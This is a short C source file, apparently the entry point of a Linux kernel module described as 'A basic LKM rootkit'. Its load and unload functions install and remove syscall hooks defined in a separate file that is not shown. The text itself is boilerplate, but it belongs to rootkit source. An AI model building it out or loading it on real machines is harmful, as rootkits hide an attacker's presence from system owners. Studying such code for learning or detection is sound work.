#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include "hook/hook.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("h1vr");
MODULE_DESCRIPTION("A basic LKM rootkit");
MODULE_VERSION("0.1");

static int __init rootkit_init(void)
{
    printk(KERN_INFO "rootkit: insmoded\n");
    int err;
    err = init_hooks();

    return err;
}

static void __exit rootkit_exit(void)
{
    remove_hooks();
    printk(KERN_INFO "rootkit: hooks removed\n");
    printk(KERN_INFO "rootkit: rmmoded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
